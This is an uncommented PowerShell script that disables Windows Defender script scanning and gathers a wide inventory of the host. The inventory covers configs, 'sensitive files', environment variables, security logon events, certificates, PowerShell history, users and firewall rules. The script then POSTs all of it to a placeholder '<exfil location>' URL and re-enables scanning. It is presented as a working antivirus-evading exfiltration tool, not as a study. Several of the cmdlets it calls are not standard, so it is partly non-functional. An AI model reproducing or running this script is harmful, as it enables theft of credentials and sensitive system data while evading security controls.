Set-MpPreference -DisableScriptScanning $true

$webServers = Get-WebServer
$webServerData = @()
foreach ($server in $webServers) {
    $data = @{
        Name = $server.Name
        Version = $server.Version
        Path = $server.Path
        State = $server.State
    }
    $webServerData += $data
}
$databases = Get-Database
$databaseData = @()
foreach ($db in $databases) {
    $data = @{
        Name = $db.Name
        Version = $db.Version
        State = $db.State
    }
    $databaseData += $data
}
$services = Get-Service
$serviceData = @()
foreach ($service in $services) {
    $data = @{
        Name = $service.Name
        DisplayName = $service.DisplayName
        Status = $service.Status
    }
    $serviceData += $data
}

$webConfigs = Get-WebConfig
$webConfigData = @()
foreach ($config in $webConfigs) {
    $data = @{
        Path = $config.Path
        Content = $config
    }
    $webConfigData += $data
}
$dbConfigs = Get-DatabaseConfig
$dbConfigData = @()
foreach ($config in $dbConfigs) {
    $data = @{
        Path = $config.Path
        Content = $config
    }
    $dbConfigData += $data
}
$sensitiveFiles = Get-SensitiveFiles
$sensitiveFileData = @()
foreach ($file in $sensitiveFiles) {
    $data = @{
        Path = $file.Path
        Content = $file
    }
    $sensitiveFileData += $data
}
$registryKeys = Get-RegistryKeys
$registryKeyData = @()
foreach ($key in $registryKeys) {
    $data = @{
        Path = $key.Path
        Value = $key.Value
    }
    $registryKeyData += $data
}

$scheduledTasks = Get-ScheduledTask
$scheduledTaskData = @()
foreach ($task in $scheduledTasks) {
    $data = @{
        Name = $task.Name
        State = $task.State
        Actions = $task.Actions
    }
    $scheduledTaskData += $data
}
$logs = Get-Logs
$logData = @()
foreach ($log in $logs) {
    $data = @{
        Path = $log.Path
        Content = $log
    }
    $logData += $data
}
$processes = Get-Process
$processData = @()
foreach ($process in $processes) {
    $data = @{
        Name = $process.Name
        Id = $process.Id
        Path = $process.Path
    }
    $processData += $data
}
$connections = Get-NetTCPConnection
$connectionData = @()
foreach ($connection in $connections) {
    $data = @{
        LocalAddress = $connection.LocalAddress
        LocalPort = $connection.LocalPort
        RemoteAddress = $connection.RemoteAddress
        RemotePort = $connection.RemotePort
        State = $connection.State
    }
    $connectionData += $data
}
$users = Get-LocalUser
$userData = @()
foreach ($user in $users) {
    $data = @{
        Name = $user.Name
        Enabled = $user.Enabled
        Description = $user.Description
        LastLogon = $user.LastLogon
    }
    $userData += $data
}

$groups = Get-LocalGroup
$groupData = @()
foreach ($group in $groups) {
    $data = @{
        Name = $group.Name
        Description = $group.Description
        Members = $group.Members
    }
    $groupData += $data
}

$adapters = Get-NetAdapter
$adapterData = @()
foreach ($adapter in $adapters) {
    $data = @{
        Name = $adapter.Name
        InterfaceDescription = $adapter.InterfaceDescription
        Status = $adapter.Status
    }
    $adapterData += $data
}

$systemInfo = Get-ComputerInfo
$systemData = @{
    OSName = $systemInfo.OSName
    OSArchitecture = $systemInfo.OSArchitecture
    OSVersion = $systemInfo.OSVersion
    TotalPhysicalMemory = $systemInfo.TotalPhysicalMemory
    TotalVirtualMemory = $systemInfo.TotalVirtualMemory
    TotalVisibleMemorySize = $systemInfo.TotalVisibleMemorySize
    Model = $systemInfo.Model
    Manufacturer = $systemInfo.Manufacturer
}

$envVars = Get-ChildItem Env:
$envVarData = @()
foreach ($var in $envVars) {
    $data = @{
        Name = $var.Name
        Value = $var.Value
    }
    $envVarData += $data
}
$authLogs = Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4624}
$authLogData = @()
foreach ($log in $authLogs) {
    $data = @{
        TimeGenerated = $log.TimeGenerated
        EventID = $log.EventID
        Message = $log.Message
    }
    $authLogData += $data
}

$fwRules = Get-NetFirewallRule
$fwRuleData = @()
foreach ($rule in $fwRules) {
    $data = @{
        Name = $rule.Name
        DisplayName = $rule.DisplayName
        Enabled = $rule.Enabled
        Profile = $rule.Profile
    }
    $fwRuleData += $data
}

$certs = Get-ChildItem Cert:\LocalMachine\My
$certData = @()
foreach ($cert in $certs) {
    $data = @{
        Thumbprint = $cert.Thumbprint
        Subject = $cert.Subject
        NotAfter = $cert.NotAfter
    }
    $certData += $data
}
$psHistory = Get-History
$psHistoryData = @()
foreach ($entry in $psHistory) {
    $data = @{
        Id = $entry.Id
        CommandLine = $entry.CommandLine
    }
    $psHistoryData += $data
}

$data = @{
    WebServers = $webServerData
    Databases = $databaseData
    Services = $serviceData
    WebConfigs = $webConfigData
    DBConfigs = $dbConfigData
    SensitiveFiles = $sensitiveFileData
    RegistryKeys = $registryKeyData
    ScheduledTasks = $scheduledTaskData
    Logs = $logData
    Processes = $processData
    Connections = $connectionData
    Users = $userData
    Groups = $groupData
    Adapters = $adapterData
    SystemInfo = $systemData
    EnvironmentVariables = $envVarData
    AuthenticationLogs = $authLogData
    FirewallRules = $fwRuleData
    Certificates = $certData
    PowerShellHistory = $psHistoryData
}

$jsonData = $data | ConvertTo-Json -Depth 10
$jsonData | Out-File "inventory.json"

$url = "<exfil location>"
Invoke-WebRequest -Uri $url -Method POST -Body $jsonData

Set-MpPreference -DisableScriptScanning $false
